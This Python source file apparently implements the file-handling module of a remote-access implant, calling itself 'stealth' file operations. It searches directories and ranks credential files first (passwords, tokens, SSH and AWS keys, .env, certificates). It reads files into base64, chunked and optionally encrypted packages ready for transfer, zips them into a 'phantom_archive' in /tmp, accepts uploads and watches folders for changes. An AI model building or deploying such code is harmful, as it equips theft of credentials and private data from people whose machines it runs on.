import os
import base64
import json
import hashlib
import shutil
import time
import stat
import fnmatch
import zipfile
import tarfile
import io
from pathlib import Path
from datetime import datetime
import logging

logger = logging.getLogger(__name__)

class EnhancedFileOps:
    """
    Enhanced file operations with encryption, compression, and stealth
    """
    
    def __init__(self, encryption_key=None):
        self.encryption_key = encryption_key
        self.transfer_chunk_size = 8192  # 8KB chunks
        self.max_file_size = 100 * 1024 * 1024  # 100MB limit
        
        # File patterns to prioritize
        self.priority_patterns = [
            '*.txt', '*.doc', '*.docx', '*.pdf', '*.xls', '*.xlsx',
            '*.ppt', '*.pptx', '*.sql', '*.db', '*.json', '*.xml',
            '*.config', '*.conf', '*.yml', '*.yaml', '*.ini',
            '*.pem', '*.key', '*.crt', '*.pfx', '*.p12',
            '*.zip', '*.rar', '*.7z', '*.tar', '*.gz'
        ]
        
        # Sensitive file patterns
        self.sensitive_patterns = [
            '*password*', '*secret*', '*key*', '*token*',
            '*credential*', '*login*', '*config*', '*backup*',
            '*.env', '.gitignore', '.ssh/*', '.aws/*'
        ]
    
    def list_files(self, path, recursive=True, filter_pattern=None):
        """
        List files with metadata
        """
        try:
            if not os.path.exists(path):
                return []
            
            files = []
            
            if recursive:
                for root, dirs, filenames in os.walk(path):
                    # Skip system directories
                    dirs[:] = [d for d in dirs if not self._is_system_dir(d)]
                    
                    for filename in filenames:
                        filepath = os.path.join(root, filename)
                        
                        if filter_pattern and not fnmatch.fnmatch(filename, filter_pattern):
                            continue
                        
                        if self._should_skip_file(filepath):
                            continue
                        
                        files.append(self._get_file_info(filepath))
                        
                        # Limit results for large directories
                        if len(files) >= 1000:
                            return files
            else:
                for item in os.listdir(path):
                    filepath = os.path.join(path, item)
                    
                    if os.path.isfile(filepath):
                        if filter_pattern and not fnmatch.fnmatch(item, filter_pattern):
                            continue
                        
                        if self._should_skip_file(filepath):
                            continue
                        
                        files.append(self._get_file_info(filepath))
            
            # Sort by priority patterns
            files.sort(key=lambda x: self._get_file_priority(x['name']), reverse=True)
            
            return files
            
        except Exception as e:
            logger.error(f"Error listing files: {e}")
            return []
    
    def _get_file_info(self, filepath):
        """Get detailed file information"""
        try:
            stat_info = os.stat(filepath)
            
            return {
                'name': os.path.basename(filepath),
                'path': filepath,
                'size': stat_info.st_size,
                'modified': stat_info.st_mtime,
                'created': stat_info.st_ctime,
                'accessed': stat_info.st_atime,
                'permissions': stat.S_IMODE(stat_info.st_mode),
                'is_dir': os.path.isdir(filepath),
                'extension': os.path.splitext(filepath)[1].lower(),
                'hash': self._calculate_file_hash(filepath) if stat_info.st_size < 1048576 else None  # 1MB limit for hash
            }
        except:
            return {'name': os.path.basename(filepath), 'path': filepath, 'error': 'access_denied'}
    
    def _calculate_file_hash(self, filepath, algorithm='sha256'):
        """Calculate file hash"""
        try:
            hasher = hashlib.new(algorithm)
            with open(filepath, 'rb') as f:
                while chunk := f.read(65536):  # 64KB chunks
                    hasher.update(chunk)
            return hasher.hexdigest()
        except:
            return None
    
    def _should_skip_file(self, filepath):
        """Check if file should be skipped"""
        # Skip system files
        skip_patterns = [
            'pagefile.sys', 'hiberfil.sys', 'swapfile.sys',
            '$RECYCLE.BIN', 'System Volume Information',
            '.DS_Store', 'Thumbs.db', 'desktop.ini'
        ]
        
        filename = os.path.basename(filepath).lower()
        if any(pattern.lower() in filename for pattern in skip_patterns):
            return True
        
        # Skip large files
        try:
            if os.path.getsize(filepath) > self.max_file_size:
                return True
        except:
            pass
        
        return False
    
    def _is_system_dir(self, dirname):
        """Check if directory is system directory"""
        system_dirs = [
            '$RECYCLE.BIN', 'System Volume Information',
            '.git', '.svn', '.hg', '.idea', '.vscode',
            'node_modules', '__pycache__'
        ]
        
        return dirname in system_dirs
    
    def _get_file_priority(self, filename):
        """Get file priority based on patterns"""
        for pattern in self.priority_patterns:
            if fnmatch.fnmatch(filename.lower(), pattern):
                return 2  # High priority
        
        for pattern in self.sensitive_patterns:
            if fnmatch.fnmatch(filename.lower(), pattern):
                return 3  # Highest priority (sensitive)
        
        return 1  # Normal priority
    
    def download_file(self, filepath, chunked=False, chunk_size=None):
        """
        Download file with optional chunking and encryption
        """
        if not os.path.exists(filepath):
            return None
        
        try:
            file_size = os.path.getsize(filepath)
            
            if chunked:
                # Prepare chunked download
                chunks = []
                total_chunks = (file_size + (chunk_size or self.transfer_chunk_size) - 1) // (chunk_size or self.transfer_chunk_size)
                
                with open(filepath, 'rb') as f:
                    for chunk_num in range(total_chunks):
                        chunk = f.read(chunk_size or self.transfer_chunk_size)
                        
                        chunk_data = {
                            'chunk_num': chunk_num,
                            'total_chunks': total_chunks,
                            'data': base64.b64encode(chunk).decode(),
                            'hash': hashlib.sha256(chunk).hexdigest() if chunk else None
                        }
                        
                        if self.encryption_key:
                            chunk_data = self._encrypt_chunk(chunk_data)
                        
                        chunks.append(chunk_data)
                
                return {
                    'filename': os.path.basename(filepath),
                    'total_size': file_size,
                    'chunks': chunks,
                    'original_hash': self._calculate_file_hash(filepath),
                    'chunked': True
                }
            else:
                # Single download
                with open(filepath, 'rb') as f:
                    data = f.read()
                
                result = {
                    'filename': os.path.basename(filepath),
                    'data': base64.b64encode(data).decode(),
                    'size': len(data),
                    'hash': hashlib.sha256(data).hexdigest(),
                    'chunked': False
                }
                
                if self.encryption_key:
                    result = self._encrypt_data(result)
                
                return result
                
        except Exception as e:
            logger.error(f"Error downloading file: {e}")
            return None
    
    def upload_file(self, filepath, data, chunked=False):
        """
        Upload file with optional chunk reassembly
        """
        try:
            # Create directory if it doesn't exist
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            
            if chunked:
                # Reassemble chunks
                if not isinstance(data, list):
                    return False
                
                # Sort chunks
                data.sort(key=lambda x: x.get('chunk_num', 0))
                
                # Verify all chunks are present
                total_chunks = data[0].get('total_chunks', 0)
                if len(data) != total_chunks:
                    logger.error(f"Missing chunks: got {len(data)}, expected {total_chunks}")
                    return False
                
                # Decrypt chunks if needed
                if self.encryption_key:
                    data = [self._decrypt_chunk(chunk) for chunk in data]
                
                # Reassemble file
                with open(filepath, 'wb') as f:
                    for chunk in data:
                        chunk_data = base64.b64decode(chunk.get('data', ''))
                        
                        # Verify chunk hash
                        expected_hash = chunk.get('hash')
                        if expected_hash and hashlib.sha256(chunk_data).hexdigest() != expected_hash:
                            logger.error(f"Chunk hash mismatch")
                            return False
                        
                        f.write(chunk_data)
                
                # Verify complete file hash
                if data[0].get('original_hash'):
                    file_hash = self._calculate_file_hash(filepath)
                    if file_hash != data[0]['original_hash']:
                        logger.error(f"File hash mismatch")
                        os.remove(filepath)
                        return False
                
            else:
                # Single file upload
                if self.encryption_key:
                    data = self._decrypt_data(data)
                
                file_data = base64.b64decode(data.get('data', ''))
                
                # Verify hash if provided
                if data.get('hash'):
                    if hashlib.sha256(file_data).hexdigest() != data['hash']:
                        logger.error(f"File hash mismatch")
                        return False
                
                with open(filepath, 'wb') as f:
                    f.write(file_data)
            
            # Set appropriate permissions
            os.chmod(filepath, 0o600)  # Owner read/write only
            
            return True
            
        except Exception as e:
            logger.error(f"Error uploading file: {e}")
            
            # Cleanup partial file
            if os.path.exists(filepath):
                try:
                    os.remove(filepath)
                except:
                    pass
            
            return False
    
    def _encrypt_data(self, data):
        """Encrypt data"""
        try:
            from cryptography.fernet import Fernet
            import base64
            
            if isinstance(self.encryption_key, bytes):
                fernet = Fernet(self.encryption_key)
            else:
                fernet = Fernet(base64.urlsafe_b64encode(self.encryption_key.encode().ljust(32)[:32]))
            
            json_str = json.dumps(data).encode()
            encrypted = fernet.encrypt(json_str)
            
            return {
                'encrypted': True,
                'data': base64.b64encode(encrypted).decode()
            }
        except:
            return data
    
    def _decrypt_data(self, data):
        """Decrypt data"""
        try:
            from cryptography.fernet import Fernet
            import base64
            
            if 'encrypted' not in data or not data['encrypted']:
                return data
            
            if isinstance(self.encryption_key, bytes):
                fernet = Fernet(self.encryption_key)
            else:
                fernet = Fernet(base64.urlsafe_b64encode(self.encryption_key.encode().ljust(32)[:32]))
            
            encrypted = base64.b64decode(data['data'].encode())
            decrypted = fernet.decrypt(encrypted).decode()
            
            return json.loads(decrypted)
        except:
            return data
    
    def _encrypt_chunk(self, chunk_data):
        """Encrypt chunk data"""
        return self._encrypt_data(chunk_data)
    
    def _decrypt_chunk(self, chunk_data):
        """Decrypt chunk data"""
        return self._decrypt_data(chunk_data)
    
    def search_files(self, root_path, search_term, file_type=None):
        """
        Search files by content or name
        """
        results = []
        
        try:
            for root, dirs, files in os.walk(root_path):
                # Skip system directories
                dirs[:] = [d for d in dirs if not self._is_system_dir(d)]
                
                for file in files:
                    filepath = os.path.join(root, file)
                    
                    # Check file type filter
                    if file_type and not file.lower().endswith(file_type.lower()):
                        continue
                    
                    # Search in filename
                    if search_term.lower() in file.lower():
                        results.append(filepath)
                        continue
                    
                    # Search in file content (text files only)
                    if self._is_text_file(filepath):
                        try:
                            with open(filepath, 'r', errors='ignore') as f:
                                content = f.read(65536)  # Read first 64KB
                                if search_term.lower() in content.lower():
                                    results.append(filepath)
                        except:
                            pass
            
            return results
            
        except Exception as e:
            logger.error(f"Error searching files: {e}")
            return []
    
    def _is_text_file(self, filepath):
        """Check if file is likely a text file"""
        text_extensions = ['.txt', '.csv', '.json', '.xml', '.yaml', '.yml',
                          '.html', '.htm', '.css', '.js', '.py', '.java',
                          '.c', '.cpp', '.h', '.php', '.rb', '.sh', '.bat',
                          '.ps1', '.md', '.log', '.conf', '.config', '.ini']
        
        return os.path.splitext(filepath)[1].lower() in text_extensions
    
    def compress_files(self, filepaths, output_path=None):
        """
        Compress multiple files into archive
        """
        try:
            if not output_path:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                output_path = f'/tmp/phantom_archive_{timestamp}.zip'
            
            with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for filepath in filepaths:
                    if os.path.exists(filepath):
                        arcname = os.path.basename(filepath)
                        zipf.write(filepath, arcname)
            
            return output_path
            
        except Exception as e:
            logger.error(f"Error compressing files: {e}")
            return None
    
    def extract_archive(self, archive_path, output_dir=None):
        """
        Extract archive file
        """
        try:
            if not output_dir:
                output_dir = os.path.join(os.path.dirname(archive_path), 'extracted')
            
            os.makedirs(output_dir, exist_ok=True)
            
            if archive_path.endswith('.zip'):
                with zipfile.ZipFile(archive_path, 'r') as zipf:
                    zipf.extractall(output_dir)
            elif archive_path.endswith('.tar.gz') or archive_path.endswith('.tgz'):
                with tarfile.open(archive_path, 'r:gz') as tar:
                    tar.extractall(output_dir)
            elif archive_path.endswith('.tar'):
                with tarfile.open(archive_path, 'r') as tar:
                    tar.extractall(output_dir)
            else:
                logger.error(f"Unsupported archive format: {archive_path}")
                return False
            
            return output_dir
            
        except Exception as e:
            logger.error(f"Error extracting archive: {e}")
            return False
    
    def monitor_directory(self, directory, callback, interval=5):
        """
        Monitor directory for changes
        """
        def monitor_loop():
            known_files = {}
            
            while True:
                try:
                    current_files = {}
                    
                    for root, dirs, files in os.walk(directory):
                        for file in files:
                            filepath = os.path.join(root, file)
                            try:
                                stat_info = os.stat(filepath)
                                current_files[filepath] = {
                                    'size': stat_info.st_size,
                                    'mtime': stat_info.st_mtime
                                }
                            except:
                                pass
                    
                    # Check for changes
                    for filepath, info in current_files.items():
                        if filepath not in known_files:
                            # New file
                            callback('created', filepath, info)
                        elif info['mtime'] != known_files[filepath]['mtime']:
                            # Modified file
                            callback('modified', filepath, info)
                    
                    # Check for deleted files
                    for filepath in known_files:
                        if filepath not in current_files:
                            callback('deleted', filepath, None)
                    
                    known_files = current_files
                    
                except Exception as e:
                    logger.error(f"Directory monitor error: {e}")
                
                time.sleep(interval)
        
        # Start monitoring thread
        import threading
        thread = threading.Thread(target=monitor_loop, daemon=True)
        thread.start()
        
        return thread
    
    def get_disk_usage(self, path='/'):
        """
        Get disk usage information
        """
        try:
            usage = shutil.disk_usage(path)
            
            return {
                'total': usage.total,
                'used': usage.used,
                'free': usage.free,
                'percent_used': (usage.used / usage.total) * 100
            }
        except:
            return None
    
    def find_large_files(self, path, min_size_mb=10):
        """
        Find files larger than specified size
        """
        large_files = []
        
        try:
            for root, dirs, files in os.walk(path):
                for file in files:
                    filepath = os.path.join(root, file)
                    
                    try:
                        size = os.path.getsize(filepath)
                        if size > min_size_mb * 1024 * 1024:
                            large_files.append({
                                'path': filepath,
                                'size_mb': size / (1024 * 1024)
                            })
                    except:
                        pass
        except:
            pass
        
        return large_files

# Global instance with default settings
_file_ops = None

def get_file_ops(key=None):
    """Get or create file operations instance"""
    global _file_ops
    if _file_ops is None:
        _file_ops = EnhancedFileOps(encryption_key=key)
    return _file_ops

def list_files(path, recursive=True, filter_pattern=None):
    """List files in directory"""
    ops = get_file_ops()
    return ops.list_files(path, recursive, filter_pattern)

def download_file(filepath, chunked=False, chunk_size=None):
    """Download file"""
    ops = get_file_ops()
    return ops.download_file(filepath, chunked, chunk_size)

def upload_file(filepath, data, chunked=False):
    """Upload file"""
    ops = get_file_ops()
    return ops.upload_file(filepath, data, chunked)

def search_files(root_path, search_term, file_type=None):
    """Search files"""
    ops = get_file_ops()
    return ops.search_files(root_path, search_term, file_type)

if __name__ == "__main__":
    # Test file operations
    print("Testing Enhanced File Operations...")
    
    ops = EnhancedFileOps()
    
    # List files in current directory
    files = ops.list_files('.', recursive=False)
    print(f"\nFiles in current directory ({len(files)}):")
    for file in files[:5]:  # Show first 5
        print(f"  {file['name']} ({file['size']} bytes)")
    
    # Test file download
    if files:
        test_file = files[0]['path']
        print(f"\nDownloading test file: {test_file}")
        
        downloaded = ops.download_file(test_file, chunked=True)
        if downloaded:
            print(f"Downloaded {downloaded['filename']} in {len(downloaded['chunks'])} chunks")
    
    # Test search
    print("\nSearching for Python files...")
    python_files = ops.search_files('.', '.py', '.py')
    print(f"Found {len(python_files)} Python files")
    
    # Test disk usage
    usage = ops.get_disk_usage()
    if usage:
        print(f"\nDisk usage: {usage['percent_used']:.1f}% used ({usage['free'] / (1024**3):.1f} GB free)")
